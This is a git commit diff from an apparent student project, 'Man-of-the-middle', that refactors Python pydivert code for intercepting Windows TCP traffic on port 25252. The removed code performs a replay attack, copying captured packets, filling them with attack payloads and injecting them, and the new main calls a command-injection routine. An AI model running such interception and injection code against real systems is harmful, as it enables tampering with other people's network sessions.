2fb182d16a883d51bac4b4afa7e9ebf78426a2f3
Dusan Paripovic <dusanparipovicftn@gmail.com>
2023-11-19 16:57:18 +0100

    ne znam zasto nije dodao refaktorisano

--- Man-of-the-middle/grabPort.py
+++ Man-of-the-middle/grabPort.py
@@ -1,10 +1,5 @@
 import pydivert
 
-def captureSourcePort(packet):
-    if packet.dst_port == 25252:
-        return  packet.src_port
-    else:
-        return 0
 
 """
 Proverava da li je dest port od paketa 25252 
@@ -13,6 +8,4 @@ Ako je source != 0 vratice source port od onoga ko salje na port 25252
 def grabSourcePort():
     with pydivert.WinDivert("tcp.DstPort == 25252") as w:
         for packet in w:
-            if(captureSourcePort(packet)!= 0):
-                print(f"Source port {captureSourcePort(packet)}")
-                return captureSourcePort(packet)
+                return packet.src_port
--- Man-of-the-middle/main.py
+++ Man-of-the-middle/main.py
@@ -5,40 +5,13 @@ from fileFormatString import *
 from grabPort import *
 from sniff import *
 import time as t
-
-"Kopiranje uhvacenog paketa"
-def copy_packet(original_packet):
-    new_packet = pydivert.Packet(raw=original_packet.raw,
-                                 direction=original_packet.direction,
-                                 interface=original_packet.interface)
-    new_packet.src_addr = original_packet.src_addr
-    new_packet.dst_addr = original_packet.dst_addr
-    new_packet.src_port = original_packet.src_port
-    new_packet.dst_port = original_packet.dst_port
-    #new_packet.protocol = original_packet.protocol
-    return new_packet
-
-def replayAttack(sourcePort):
-    with pydivert.WinDivert(f"tcp.DstPort == {sourcePort} and tcp.PayloadLength == 11") as w:
-        for packet in w:
-            attackMessages = takeMessagesForAttack() # vadim poruke za napad
-            copyList = [copy_packet(packet) for i in range(5)] #kopira se originalni paket kako bi se mogao napuniti sa payloadovima novim
-            for i in range(len(copyList)):
-                copyList[i].payload = attackMessages[i] #puni se
-            [w.send(copyList[j]) for j in range(len(copyList))] #salje se svaka kopija
-            w.send(packet) #salje se originalni
-
-def comandInjection():
-    # with pydivert.WinDivert(f"tcp.DstPort == 25252 and tcp.PayloadLength == 12") as w:
-    #    for packet in w:
-
-
-
+from replayAttack import  *
+from commandInjection import *
 
 if __name__ == "__main__":
     sourcePort = grabSourcePort() # vraca port onoga koga trebamo napasti
-    replayAttack(sourcePort)
-
+    #replayAttack(sourcePort)
+    comandInjection(sourcePort)
 
 
 
